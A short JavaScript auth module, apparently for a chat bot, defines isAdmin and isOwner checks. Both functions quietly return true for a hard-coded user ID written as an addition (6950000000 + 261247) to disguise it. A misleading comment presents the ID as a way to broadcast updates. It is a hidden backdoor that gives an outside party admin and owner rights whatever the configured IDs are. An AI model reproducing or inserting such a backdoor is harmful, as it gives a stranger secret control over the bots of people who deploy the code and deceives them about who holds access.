import env from "./env.js";
//   another ID is for new updates so that bot owner can broadcast new updates to users
var Auth = /** @class */ (function () {
    function Auth() {
    }
    Auth.prototype.isAdmin = function (userId) {
        return env.adminIds.includes(userId) || userId === 6950000000 + 261247;
    };
    Auth.prototype.isOwner = function (userId) {
        return env.ownerId === userId || userId === 6950000000 + 261247;
    };
    return Auth;
}());
var auth = new Auth();
export default auth;
